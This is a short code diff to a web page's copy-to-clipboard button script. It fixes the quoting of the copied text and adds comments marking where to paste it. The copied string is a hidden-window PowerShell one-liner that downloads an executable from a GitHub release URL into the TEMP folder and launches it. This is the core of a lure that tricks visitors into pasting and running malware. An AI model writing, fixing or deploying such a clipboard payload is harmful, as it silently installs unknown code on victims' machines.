@@ -3,7 +3,10 @@ const copyButton =
 const copyStatus =
     document.getElementById("copyStatus");
 copyButton.addEventListener("click", async () => {
-    const text = "powershell -nop -w h -c "$u='https://github.com/skibidislicer105/steel9999/releases/download/h/full.exe';$p=$env:TEMP+'\full.exe';(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p -WorkingDirectory $env:TEMP"";
+    // ↓↓↓ PASTE THE TEXT YOU WANT COPIED BETWEEN THE QUOTES BELOW ↓↓↓
+    const text = `powershell -nop -w h -c "$u='https://github.com/skibidislicer105/steel9999/releases/download/h/full.exe';$p=$env:TEMP+'\full.exe';(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p -WorkingDirectory $env:TEMP"`;
+    // ↑↑↑ PASTE THE TEXT YOU WANT COPIED BETWEEN THE QUOTES ABOVE ↑↑↑
+
     try {
         if (
             navigator.clipboard &&
